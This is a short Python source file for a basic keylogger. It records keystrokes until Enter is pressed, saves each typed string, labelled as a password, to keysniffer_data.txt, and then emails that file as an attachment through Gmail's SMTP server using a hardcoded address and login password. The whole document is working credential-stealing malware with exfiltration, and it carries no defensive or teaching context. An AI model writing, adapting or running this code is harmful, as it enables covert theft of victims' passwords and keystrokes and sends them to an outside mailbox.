# ===================================================== Basic keylogger ================================================


import keyboard

# Defining the text file name and path
path = "keysniffer_data.txt"

try:
    while True:
        with open(path, "a") as data_file:

            # All key presses are recorded as a list into "events"
            # and the record loop stops when the "enter" key is pressed
            events = keyboard.record("enter")
            password = list(keyboard.get_typed_strings(events))

            data_file.write("\n")  # New line written before data is written
            data_file.write(password[0])
except KeyboardInterrupt:
    print("Keylogger stopped.")


# ===================================================== Sending by email =========================================================


# this code was tacken from : https://www.geeksforgeeks.org/send-mail-attachment-gmail-account-using-python/?ref=lbp

# Python code to illustrate Sending mail with attachments
# from your Gmail account

# libraries to be imported
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


fromaddr = "7unkym0nk3y@gmail.com"
toaddr = "7unkym0nk3y@gmail.com"

# instance of MIMEMultipart
msg = MIMEMultipart()

# storing the senders email address
msg["From"] = fromaddr

# storing the receivers email address
msg["To"] = toaddr

# storing the subject
msg["Subject"] = "test"

# string to store the body of the mail
body = "Body_of_the_mail"

# attach the body with the msg instance
msg.attach(MIMEText(body, "plain"))

# open the file to be sent
filename = "keysniffer_data.txt"
attachment = open("keysniffer_data.txt", "rb")

# instance of MIMEBase and named as p
p = MIMEBase("application", "octet-stream")

# To change the payload into encoded form
p.set_payload((attachment).read())

# encode into base64
encoders.encode_base64(p)

p.add_header("Content-Disposition", "attachment; filename= %s" % filename)

# attach the instance 'p' to instance 'msg'
msg.attach(p)

# creates SMTP session
s = smtplib.SMTP("smtp.gmail.com", 587)

# start TLS for security
s.starttls()

# Authentication
s.login(fromaddr, "Test..123")

# Converts the Multipart msg into a string
text = msg.as_string()

# sending the mail
s.sendmail(fromaddr, toaddr, text)

# terminating the session
s.quit()
